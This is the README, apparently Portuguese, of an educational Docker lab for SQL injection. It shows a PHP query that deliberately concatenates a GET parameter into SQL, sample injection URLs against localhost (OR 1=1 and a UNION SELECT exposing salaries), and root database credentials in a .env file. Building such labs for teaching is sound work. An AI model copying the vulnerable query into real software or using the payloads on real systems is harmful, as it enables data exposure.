# Lab SQL Injection (PHP + MySQL + Docker)

Laboratório educacional para estudo de **SQL Injection** utilizando **PHP 8.2**, **MySQL 8** e **Docker**. O objetivo é demonstrar, de forma controlada, como aplicações vulneráveis podem ser exploradas quando consultas SQL são montadas de forma insegura.

> ⚠️ **Atenção**: Este projeto é **exclusivamente para fins educacionais**. Não utilize este código em ambientes reais.

---

## 📦 Tecnologias Utilizadas

* PHP 8.2 (Apache)
* MySQL 8.0
* Docker / Docker Compose
* PDO (sem prepared statements – propositalmente vulnerável)

---

## 📁 Estrutura do Projeto

```
LAB SQL INJECTION/
├── database/
│   └── init.sql
├── src/
│   └── index.php
├── .env
├── docker-compose.yml
├── Dockerfile
└── README.md
```

---

## 🐳 Dockerfile

Responsável por criar o container da aplicação PHP.

**Principais ações:**

* Usa a imagem `php:8.2-apache`
* Instala extensões `mysqli`, `pdo` e `pdo_mysql`
* Ativa o módulo `rewrite`
* Define `/var/www/html` como diretório de trabalho
* Ajusta permissões para o Apache (`www-data`)

---

## 🐳 Docker Compose

Orquestra dois serviços:

### 🔹 app (PHP)

* Build a partir do `Dockerfile`
* Expõe a aplicação na porta definida no `.env`
* Compartilha o código-fonte via volume
* Conecta-se ao banco de dados via variáveis de ambiente

### 🔹 db (MySQL)

* Imagem `mysql:8.0`
* Cria automaticamente o banco e as tabelas via `init.sql`
* Persiste dados usando volume nomeado

---

## ⚙️ Variáveis de Ambiente (.env)

```
DB_PASSWORD=root
DB_NAME=SQL-INJECTION
APP_PORT=8080
DB_HOST=db
DB_USER=root
```

---

## ▶️ Como Executar o Laboratório

1. Certifique-se de ter **Docker** e **Docker Compose** instalados
2. Na raiz do projeto, execute:

```
docker-compose up --build
```

3. Acesse no navegador:

```
http://localhost:8080
```

---

## 🧪 Funcionamento da Vulnerabilidade

A aplicação recebe o parâmetro `id` via **GET** e o concatena diretamente na query SQL:

```php
$sql = "SELECT usuario, cargo FROM funcionarios WHERE id = " . $id_usuario;
```

Isso torna a aplicação vulnerável a **SQL Injection**, pois não há validação nem uso de *prepared statements*.

---

## 💥 Exemplos de Testes de SQL Injection

### 🔸 Consulta normal

```
http://localhost:8080/?id=1
```

### 🔸 Bypass de filtro lógico

```
http://localhost:8080/?id=1 OR 1=1
```

### 🔸 Enumerar estrutura

```
http://localhost:8080/?id=1 UNION SELECT usuario, salario FROM funcionarios
```

> Observe que o campo **salário**, que deveria ser confidencial, pode ser exposto.

---

## 📚 Objetivos Educacionais

* Compreender o funcionamento de SQL Injection
* Visualizar queries vulneráveis em tempo real
* Praticar exploração básica de falhas
* Reforçar a importância de *prepared statements*

---


